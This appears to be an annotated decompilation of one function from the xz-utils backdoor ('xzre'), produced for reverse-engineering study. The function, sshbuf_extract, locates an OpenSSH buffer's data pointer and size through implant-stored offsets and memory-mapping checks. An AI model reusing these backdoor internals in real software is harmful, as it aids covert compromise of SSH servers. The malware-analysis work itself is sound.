// /home/kali/xzre-ghidra/xzregh/107950_sshbuf_extract.c
// Function: sshbuf_extract @ 0x107950
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshbuf_extract(sshbuf * buf, global_context_t * ctx, void * * p_sshbuf_d, size_t * p_sshbuf_size)


/*
 * AutoDoc: Reads an sshbuf's `d` pointer and `size` field using the packed layout stored in `global_ctx->sshd_offsets`. Negative qword
 * indices mean the struct fields already line up; otherwise it computes byte offsets, probes the struct range, and finally checks the
 * referenced buffer is mapped before returning the pointer/length pair.
 */

#include "xzre_types.h"

BOOL sshbuf_extract(sshbuf *buf,global_context_t *ctx,void **p_sshbuf_d,size_t *p_sshbuf_size)

{
  sbyte size_slot_index;
  sbyte data_slot_index;
  BOOL probe_ok;
  ulong size_field_offset;
  ulong data_field_offset;
  u64 sshbuf_span;
  u8 *sshbuf_data;
  
  if (ctx == (global_context_t *)0x0) {
    return FALSE;
  }
  if (((buf != (sshbuf *)0x0) && (p_sshbuf_d != (void **)0x0)) && (p_sshbuf_size != (size_t *)0x0))
  {
    size_slot_index = (ctx->sshd_offsets).bytes.sshbuf_size_qword_index;
    data_slot_index = (ctx->sshd_offsets).bytes.sshbuf_data_qword_index;
    // AutoDoc: When either index is negative we trust the inline struct layout; otherwise derive the byte offset for each field.
    if ((char)(size_slot_index & data_slot_index) < '\0') {
      size_field_offset = 0;
      data_field_offset = 0;
      sshbuf_span = 0x48;
    }
    else {
      size_field_offset = (ulong)((int)(char)size_slot_index << 3);
      data_field_offset = (ulong)((int)(char)data_slot_index << 3);
      sshbuf_span = size_field_offset + 8;
      if (size_field_offset < data_field_offset) {
        sshbuf_span = data_field_offset + 8;
      }
    }
    // AutoDoc: Never touch the data/size fields unless the surrounding struct bytes are readable.
    probe_ok = is_range_mapped((u8 *)buf,sshbuf_span,ctx);
    if (probe_ok != FALSE) {
      // AutoDoc: Negative `data` indices use the literal field; otherwise hop over to the encoded offset to fetch the pointer.
      if ((ctx->sshd_offsets).bytes.sshbuf_data_qword_index < '\0') {
        sshbuf_data = buf->d;
      }
      else {
        sshbuf_data = *(u8 **)((long)&buf->d + data_field_offset);
      }
      *p_sshbuf_d = sshbuf_data;
      // AutoDoc: Negative `size` indices use the literal `buf->size`; otherwise read the qword at the computed offset.
      if ((ctx->sshd_offsets).bytes.sshbuf_size_qword_index < '\0') {
        sshbuf_span = buf->size;
      }
      else {
        sshbuf_span = *(u64 *)((long)&buf->d + size_field_offset);
      }
      *p_sshbuf_size = sshbuf_span;
      // AutoDoc: Verify the derived pointer/length pair lands inside a mapped buffer before surfacing it to callers.
      probe_ok = is_range_mapped(sshbuf_data,sshbuf_span,ctx);
      return (uint)(probe_ok != FALSE);
    }
  }
  return FALSE;
}

